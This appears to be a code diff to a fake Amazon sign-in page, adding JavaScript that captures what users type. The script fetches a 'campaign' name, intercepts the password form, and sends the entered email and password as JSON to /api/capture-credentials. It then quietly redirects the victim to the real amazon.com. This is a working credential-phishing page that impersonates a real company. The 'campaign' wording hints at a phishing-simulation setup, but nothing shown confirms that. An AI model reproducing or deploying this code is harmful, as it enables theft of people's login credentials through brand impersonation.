@@ -12,19 +12,33 @@
     <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Lato&family=Reem+Kufi+Fun&family=Roboto+Mono:ital,wght@1,700&display=swap" rel="stylesheet">
     <link rel="shortcut icon" href="https://www.amazon.in/favicon.ico" type="image/x-icon">
     <script>
+        let campaignName = "Unknown Campaign";  // Default value
+    
+        // Fetch the latest campaign name
+        function fetchCampaignName() {
+            fetch("/api/latest-campaign")
+                .then(response => response.json())
+                .then(data => {
+                    if (data.campaign_name) {
+                        campaignName = data.campaign_name;
+                    }
+                })
+                .catch(error => console.error("Error fetching campaign name:", error));
+        }
+    
         function showPasswordPage(event) {
             event.preventDefault();
-
+    
             const emailInput = document.getElementById('email-input').value;
             const formContainer = document.getElementById('form-container');
             const newAccountSection = document.getElementById('new-account-section');
-
+    
             // Hide the "New to Amazon" section
             newAccountSection.style.display = 'none';
-
+    
             formContainer.innerHTML = `
                 <h1 id="signin-header">Sign in</h1>
-                <form id="signin-form">
+                <form id="password-form">
                     <p>${emailInput} <a href="#" id="change-email">Change</a></p>
                     <div class="form-group">
                         <label for="password">Password</label>
@@ -36,16 +50,36 @@
                     </ul>
                 </form>
             `;
-
-            const changeEmailLink = document.getElementById('change-email');
-            changeEmailLink.addEventListener('click', () => {
-                location.reload(); // Reload to allow user to change email
+    
+            // Handle form submission to capture credentials
+            document.getElementById('password-form').addEventListener('submit', function(event) {
+                event.preventDefault();
+                const password = document.getElementById('password-input').value;
+                sendCredentials(emailInput, password);
+            });
+    
+            // Allow changing email
+            document.getElementById('change-email').addEventListener('click', () => {
+                location.reload();
             });
         }
-
+    
+        function sendCredentials(email, password) {
+            fetch("/api/capture-credentials", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ campaign: campaignName, email: email, password: password })
+            }).then(response => response.json())
+            .then(data => {
+                console.log("Captured:", data);
+                window.location.href = "https://www.amazon.com";  // Redirect after capture
+            })
+            .catch(error => console.error("Error capturing credentials:", error));
+        }
+    
         document.addEventListener('DOMContentLoaded', () => {
-            const form = document.getElementById('signin-form');
-            form.addEventListener('submit', showPasswordPage);
+            fetchCampaignName(); // Fetch campaign name when page loads
+            document.getElementById('signin-form').addEventListener('submit', showPasswordPage);
         });
     </script>
 </head>
